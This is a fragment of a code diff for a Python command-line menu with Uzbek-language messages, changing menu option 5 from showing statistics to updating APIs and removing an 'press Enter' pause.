-        elif choice == '5': show_stats()
+        elif choice == '5': update_apis()
         elif choice == '0':
             print(f"\n{C.GREEN}👋 Xayr!{C.END}")
             sys.exit(0)
         else:
             print(f"{C.RED}❌ Notoʻgʻri!{C.END}")
             time.sleep(1)
-        input(f"\n{C.BLUE}↩️  Enter bosish...{C.END}")
 
 if __name__ == "__main__":
     try:
